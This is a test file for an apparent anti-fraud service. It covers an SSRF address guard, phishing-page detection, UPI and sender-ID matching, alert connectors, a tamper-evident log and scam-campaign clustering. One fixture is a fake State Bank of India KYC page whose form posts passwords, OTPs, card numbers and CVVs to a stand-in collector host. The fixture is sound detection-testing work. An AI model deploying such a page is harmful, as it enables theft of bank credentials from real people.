import { describe, expect, it } from "vitest";
import { analyzeUrl } from "../shared/risk.js";
import { buildCampaigns, jaccard, templateEdges, type IdentNode } from "../src/campaigns/graph.js";
import { formatEvent, interpolate, matchesFilter, parseConfig } from "../src/connectors/connectors.js";
import { analyzeHtml, correlate, type LiveFacts } from "../src/linkscan/analyze.js";
import { isPrivateIp } from "../src/linkscan/scan.js";
import type { LiveEvent } from "../src/live/bus.js";
import { matchTenant, newApiKey } from "../src/partners/partners.js";
import { entryHash, GENESIS, verifyChain, type LogEntry } from "../src/services/transparency.js";

const NOW = Date.UTC(2026, 9, 31, 12);

describe("link check: SSRF guard and page analysis", () => {
  it("blocks private, loopback, link-local and reserved addresses", () => {
    for (const ip of ["127.0.0.1", "10.1.2.3", "172.20.1.1", "192.168.1.5", "169.254.169.254", "100.64.0.1", "0.0.0.0", "::1", "fd00::1", "fe80::1", "::ffff:10.0.0.1", "224.0.0.1"]) expect(isPrivateIp(ip), ip).toBe(true);
    for (const ip of ["8.8.8.8", "104.16.1.1", "2606:4700::1111"]) expect(isPrivateIp(ip), ip).toBe(false);
  });
  const phish = `<html><head><title>SBI YONO - Update KYC</title></head><body oncontextmenu="return false">
    <h1>State Bank of India</h1><form action="https://collector.example-steal.ru/post.php" method="post">
    <input name="username"><input type="password" name="pass"><input name="otp_code" placeholder="Enter OTP">
    <input name="card_number" autocomplete="cc-number"><input name="cvv"></form>
    <a href="/app/sbi-update.apk">Download app</a></body></html>`;
  it("finds the fields a phishing page asks for, its brand claim and where the form posts", () => {
    const f = analyzeHtml(phish, "https://sbi-yono-kyc.top/update");
    expect(f.asks_for).toEqual(expect.arrayContaining(["password", "otp", "card", "cvv"]));
    expect(f.brands).toContain("SBI");
    expect(f.external_form_hosts).toContain("collector.example-steal.ru");
    expect(f.apk_links).toBe(1);
    expect(f.blocks_right_click).toBe(true);
  });
  it("does not claim a brand on the brand's own site", () => {
    expect(analyzeHtml("<title>SBI</title><p>State Bank of India login</p>", "https://www.onlinesbi.sbi/").brands).toEqual([]);
  });
  it("correlates static signals with live evidence into a proven verdict", () => {
    const url = "https://sbi-yono-kyc.top/update";
    const live: LiveFacts = { reachable: true, final_url: url, redirects: [], status: 200, content_type: "text/html", https: true, tls: { valid: true, issuer: "R3", valid_from: null, age_days: 3 }, domain_age_days: 6, page: analyzeHtml(phish.replace(/<a href[^<]*<\/a>/, ""), url), error: null };
    const r = correlate(analyzeUrl(url), live, url);
    expect(r.verdict).toBe("proven_phishing");
    expect(r.correlations.length).toBeGreaterThan(0);
    expect(r.score).toBeGreaterThanOrEqual(80);
  });
  it("a plain, harmless page has no live evidence", () => {
    const url = "https://example.org/";
    const live: LiveFacts = { reachable: true, final_url: url, redirects: [], status: 200, content_type: "text/html", https: true, tls: { valid: true, issuer: "X", valid_from: null, age_days: 400 }, domain_age_days: 9000, page: analyzeHtml("<title>Example</title><p>Hello</p>", url), error: null };
    expect(correlate(analyzeUrl(url), live, url).verdict).toBe("no_live_evidence");
  });
});

describe("partners", () => {
  it("matches UPI handles, brand look-alikes, sender IDs and areas", () => {
    const w = { upi_handles: ["oksbi"], brand_tokens: ["sbi", "yono"], sender_ids: ["SBIINB"], domains: ["sbi.co.in"], areas: ["560102"] };
    expect(matchTenant(w, "upi", "ramesh@oksbi", "110016")).toEqual(["upi_handle:@oksbi"]);
    expect(matchTenant(w, "upi", "sbi.refund@ybl", "110016")).toEqual(["brand_in_upi:sbi"]);
    expect(matchTenant(w, "url", "https://sbi-yono-kyc.top/update", "110016")).toEqual(["brand_lookalike:sbi"]);
    expect(matchTenant(w, "url", "https://retail.sbi.co.in/x", "110016")).toEqual(["own_domain:sbi.co.in"]);
    expect(matchTenant(w, "sender_id", "AD-SBIINB-T", "110016")).toEqual(["sender_id:SBIINB"]);
    expect(matchTenant(w, "phone", "+919876543210", "560102")).toEqual(["area:560102"]);
    expect(matchTenant(w, "phone", "+919876543210", "110016")).toEqual([]);
  });
  it("API keys carry the tenant id and only a hash is kept", () => {
    const k = newApiKey("demo-bank");
    expect(k.key).toMatch(/^smk_demo-bank_[A-Za-z0-9_-]{30,}$/);
    expect(k.hash).toMatch(/^[0-9a-f]{64}$/);
    expect(k.key).not.toContain(k.hash);
  });
});

describe("connectors (config-driven)", () => {
  const yaml = `
outputs:
  - name: tg
    type: telegram
    on: [alert]
    bot_token: \${TOKEN}
    chat_id: \${CHAT}
  - name: hook
    type: webhook
    on: [report, defence]
    url: https://example.com/hook
    filter: { cities: [Bengaluru], scam_types: [digital-arrest] }
inputs:
  - name: list
    type: csv_file
    path: data/x.csv
`;
  it("fills secrets from the environment and switches off connectors with missing ones", () => {
    const c = parseConfig(yaml, { TOKEN: "123:abc" });
    expect(c.outputs[0]).toMatchObject({ bot_token: "123:abc", chat_id: "" });
    expect(c.outputs[0]!.missing).toEqual(["CHAT"]);
    expect(c.outputs[1]!.missing).toEqual([]);
    expect(interpolate("a ${X} b", { X: "1" }).text).toBe("a 1 b");
  });
  it("filters events by type, city and scam type, and formats them without identifiers", () => {
    const c = parseConfig(yaml, {});
    const base = { id: 1, at: "2026-10-31T10:00:00Z", pincode: "560102", locality: "HSR Layout", locality_hi: "एचएसआर लेआउट", city: "Bengaluru" };
    const report = { ...base, type: "report", scam_type: "digital-arrest", channel: "Phone call", counted: true } as LiveEvent;
    const other = { ...base, type: "report", scam_type: "job-offer", channel: "Phone call", counted: true } as LiveEvent;
    expect(matchesFilter(c.outputs[1]!, report)).toBe(true);
    expect(matchesFilter(c.outputs[1]!, other)).toBe(false);
    expect(matchesFilter(c.outputs[0]!, report)).toBe(false);
    expect(formatEvent(report)).toBe("New report in HSR Layout, Bengaluru: Digital arrest (Phone call)");
    expect(formatEvent(report, "en", "[{city}] {text}")).toContain("[Bengaluru] New report");
  });
});

describe("transparency log", () => {
  it("detects an edited entry", () => {
    const mk = (seq: number, prev: string, to: string): LogEntry => {
      const e = { at: `2026-10-31T10:0${seq}:00+05:30`, ident_hash: `h${seq}`, from_verdict: "NO_REPORTS", to_verdict: to, people: seq };
      return { seq, ...e, prev_hash: prev, hash: entryHash(prev, e) };
    };
    const a = mk(1, GENESIS, "SUSPICIOUS");
    const b = mk(2, a.hash, "KNOWN_SCAM");
    const c = mk(3, b.hash, "KNOWN_SCAM");
    expect(verifyChain([a, b, c])).toBeNull();
    expect(verifyChain([a, { ...b, to_verdict: "NO_REPORTS" }, c])).toBe(2);
    expect(verifyChain([a, c])).toBe(3);
  });
});

describe("campaigns", () => {
  const node = (key: string, type: IdentNode["type"], verdict: IdentNode["verdict"], people: number, pin: string, first: number): IdentNode => ({
    key, type, value: key.split(":").slice(1).join(":"), verdict, people, scam_type: "fake-kyc-link", first_seen: first, last_seen: first + 3_600_000, channels: ["SMS or WhatsApp"], lost_money: 1, areas: [{ pincode: pin, first }],
  });
  it("joins identifiers reported together into one campaign with a kill chain and spread", () => {
    const nodes = [
      node("url:https://sbi-yono.top/kyc", "url", "KNOWN_SCAM", 5, "560034", NOW - 3 * 86_400_000),
      node("sender_id:SBIUPD", "sender_id", "SUSPICIOUS", 2, "411014", NOW - 2 * 86_400_000),
      node("upi:kyc.verify12@ybl", "upi", "SUSPICIOUS", 2, "500081", NOW - 86_400_000),
      node("phone:+919999999999", "phone", "KNOWN_SCAM", 4, "110016", NOW),
    ];
    const edges = [
      { a: "sender_id:SBIUPD", b: "url:https://sbi-yono.top/kyc", kind: "co_reported" as const, weight: 3 },
      { a: "upi:kyc.verify12@ybl", b: "url:https://sbi-yono.top/kyc", kind: "co_reported" as const, weight: 2 },
    ];
    const cs = buildCampaigns(nodes, edges, NOW, (k) => `id:${k}`);
    expect(cs).toHaveLength(1);
    const c = cs[0]!;
    expect(c.people).toBe(9);
    expect(c.cities).toEqual(["Bengaluru", "Pune", "Hyderabad"]);
    expect(c.chain.map((s) => s.key)).toEqual(["contact", "hook", "pressure", "payment", "cashout"]);
    expect(c.chain[1]!.identifiers).toEqual(["https://sbi-yono.top/kyc"]);
    // Suspicious identifiers stay masked, like everywhere else.
    expect(c.chain[3]!.identifiers[0]).not.toContain("kyc.verify12");
  });
  it("links different identifiers whose reports share the same wording", () => {
    const sh = Array.from({ length: 30 }, (_, i) => i);
    const e = templateEdges([
      { key: "phone:1", scam_type: "digital-arrest", shingles: sh },
      { key: "phone:2", scam_type: "digital-arrest", shingles: [...sh.slice(0, 27), 100, 101, 102] },
      { key: "phone:3", scam_type: "job-offer", shingles: sh },
    ]);
    expect(e).toEqual([{ a: "phone:1", b: "phone:2", kind: "same_template", weight: 1 }]);
    expect(jaccard([1, 2, 3], [2, 3, 4])).toBeCloseTo(0.5);
  });
});
